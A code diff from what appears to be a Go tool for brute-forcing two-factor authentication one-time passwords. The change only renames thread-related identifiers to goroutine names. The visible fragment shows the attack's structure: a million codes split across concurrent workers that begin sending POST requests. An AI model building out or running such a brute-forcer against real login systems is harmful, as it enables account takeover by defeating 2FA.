@@ -26,11 +26,11 @@ var quit = make(chan bool)
 // Max possible combinations. Defaulting to one above to avoid dealing with floats
 var maxCombinations = 1000000
 
-// Number of threads
-var maxThreads = 5
+// Number of goroutines
+var maxRoutines = 5
 
 // Attempts per thread - 50,000
-var otpTranche = maxCombinations / maxThreads
+var otpTranche = maxCombinations / maxRoutines
 
 var start = time.Now()
 
@@ -42,12 +42,12 @@ func main() {
 
 	fmt.Println("[*] Beginning bruteforce of 2FA OTP.")
 
-	fmt.Println("[*] Initialising routines: ", maxThreads)
+	fmt.Println("[*] Initialising routines: ", maxRoutines)
 
 	// Create goroutines for each of n sections of tokens
-	for r := 1; r <= maxThreads; r++ {
+	for r := 1; r <= maxRoutines; r++ {
 		wg.Add(1)
-		go runThreads(r)
+		go runRoutines(r)
 	}
 	fmt.Println("[>] All routines active.")
 	fmt.Println("[>] Time now: ", start)
@@ -57,7 +57,7 @@ func main() {
 	wg.Wait()
 }
 
-func runThreads(threadNum int) {
+func runRoutines(threadNum int) {
 	// Default return values for POST request
 	success := false
 	defaultCookie := ""
